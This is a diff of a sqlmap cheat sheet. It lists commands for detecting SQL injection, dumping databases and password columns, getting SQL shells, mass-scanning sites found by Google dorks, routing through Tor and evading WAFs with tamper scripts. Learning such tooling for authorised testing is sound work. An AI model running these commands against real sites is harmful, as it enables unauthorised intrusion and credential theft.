@@ -1,11 +1,8 @@
+# Sqlmap_cheatsheet by Mangal Lopchan
 
 # INTRODUCTION
 
 SQLMap is a python open source Cyber Security testing tool that helps automate the process of exploiting SQL injection vulnerabilities.  It features many options to help you in your testing including support for the following: MySQL, Microsoft SQL Server, Oracle, Firebird, SAP MaxDB, Redshift, Mckoi, Presto, MimerSQL, SQLite, Apache Ignite, FrontBase, and many more. It also supports 6 injection types such as error-based, time-based blind, union query, Boolean-based blind. This tool can also detect password hashes and support for breaking them using a dictionary attack. Below I will provide you with a helpful sqlmap cheat sheet to help you when you are doing your testing.
-
-
-# Sqlmap_cheatsheet by Mangal Lopchan
-
 
 # Simple usage
 
@@ -68,7 +65,7 @@ SQLMap is a python open source Cyber Security testing tool that helps automate t
     
 # Running Standard Test:
 
-* Test if website is vulnerable to SQL injection
+# Test if website is vulnerable to SQL injection
 
 Checking if website is vulnerable to SQL injection
 
@@ -76,31 +73,31 @@ The example we utilize a standard GET request. This will test different methods 
 
 sqlmap –u “https://victim-site.com/product.php?id=1”  
 
-* Enumerate all columns in databases
+# Enumerate all columns in databases
 
   List all databases in the websites DB
 
 sqlmap –u “https://victim-site.com/product.php?id=1”  --dbs
 
-* List tables
+# List tables
 
 Find out how many tables the database has and what the names are.
 
 sqlmap –u “https://victim-site.com/product.php?id=1”  -D dbname --tables
 
-* List columns of table selected DB
+# List columns of table selected DB
 
 List all columns of victim table
 
 sqlmap –u “https://victim-site.com/product.php?id=1”  –D dbname  -T tablename  --columns
 
-* List usernames
+# List usernames
 
 Get usernames from victim columns of selected table.
 
 sqlmap –u “https://victim-site.com/product.php?id=1”  –D dbname  -T tablename  -C columnname --dump
 
-* Extract pwd from victim column
+# Extract pwd from victim column
 
 Extract passwords from column
 
@@ -118,25 +115,21 @@ Google Dorks SQLMap method:
 
 sqlmap  -g ‘inurl:”products.php?id”’ –random-agent –f –batch –answer=”extending=N,follow=N,keep=N,exploit=n”
 
-Get SQL Shell
+# Get SQL Shell
 
 Sqlmap –dbms=mysql –u “https://victim-site.com/login.php” –sql-shell
 
-Get OS Shell
-
-sqlmap  --dbms=mysql –u “https://victim-site.com/login.php” –os-shell
-
-Tor scanning:
+# Tor scanning:
 
 sqlmap –u “https://victim-site.com/product.php?id=1” –tor –tor-type=SOCKS5
 
-There are 3 risk values:
+# There are 3 risk values:
 
     Risk 1: Default level
     Risk 2: Heavy query time based injections
     Risk 3: Adds OR based injections
 
-Levels:
+# Levels:
 
     Level 2: HTTP Cookie Header Testing
     Level 3 HTTP User Agent and Referer Header Testing
@@ -144,7 +137,7 @@ Levels:
 
 sqlmap –u “https://victim-site.com/product.php?id=1” –risk=2 –level=3
 
-Attack Method Choices:
+# Attack Method Choices:
 
 You can let SQLMap know what exploit method you want to use:
 
@@ -157,19 +150,19 @@ You can let SQLMap know what exploit method you want to use:
 
 sqlmap –u “https://victim-site.com/product.php?id=1” –technique=B
 
-Force SSL:
+# Force SSL:
 
 You can use the force SSL flag in SQLMap to utilize SSL in requests.
 
 sqlmap –u “https://victim-site.com/product.php?id=1” –force-ssl
 
-Request File:
+# Request File:
 
 Use a request file that has the HTTP request
 
 sqlmap  -r request.txt
 
-Specify Cookie Injection:
+# Specify Cookie Injection:
 
 Must set level to be 2 or greater.
 
@@ -179,9 +172,9 @@ Evade WAF and Filters with Tamper Scripts:
 
 Credit to RedCode for this one
 
-sqlmap -u “http://www.victim-site.com/product.php?id=1” — level=5 — risk=3  tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+sqlmap -u “http://www.victim-site.com/product.php?id=1” — level=5 —risk=3  tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
 
-Resources for some switches:
+# Resources for some switches:
 
 
     -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
@@ -204,7 +197,7 @@ Resources for some switches:
     --titles            Compare pages based only on their titles
     
 # Extra
-Specify The Database Type
+# Specify The Database Type
 
 sqlmap -u “https://target_site.com/page?p1=value1” --dbms=mysql
 
